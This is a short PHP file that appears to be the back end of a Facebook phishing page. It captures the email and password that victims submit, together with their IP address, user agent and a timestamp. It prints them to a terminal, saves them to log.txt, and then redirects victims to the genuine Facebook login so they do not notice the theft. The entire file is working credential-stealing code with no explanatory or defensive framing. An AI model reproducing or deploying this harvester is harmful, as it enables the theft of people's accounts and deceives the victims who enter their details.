<?php
// Set default timezone
date_default_timezone_set('Asia/Dhaka');

// Get user details
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}
$email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'N/A';
$password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'N/A';
$time = date("Y-m-d H:i:s");
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// ANSI color codes for terminal output
$blue = "\033[1;34m";
$green = "\033[1;32m";
$yellow = "\033[1;33m";
$red = "\033[1;31m";
$reset = "\033[0m";

// Create a beautiful grid box for logs
$logData = "\n+------------------------------------------------------------------------------------+\n";
$logData .= "| ${blue}Time${reset}       : $time \n";
$logData .= "| ${blue}IP${reset}         : $ip \n";
$logData .= "| ${blue}User Agent${reset} : $userAgent \n";
$logData .= "| ${blue}Email${reset}      : $email \n";
$logData .= "| ${blue}Password${reset}   : $password \n";
$logData .= "+------------------------------------------------------------------------------------+\n";

// ✅ Print to terminal with colors
file_put_contents("php://stdout", $blue . $logData . $reset);

// ✅ Save to log file with timestamp
$logFile = "log.txt";
if (!file_exists($logFile)) {
    file_put_contents($logFile, "=== Log File Created ===\n");
}
file_put_contents($logFile, $logData, FILE_APPEND);

// ✅ Redirect to Facebook login page
header("Location: https://www.facebook.com/login/");
exit();
?>
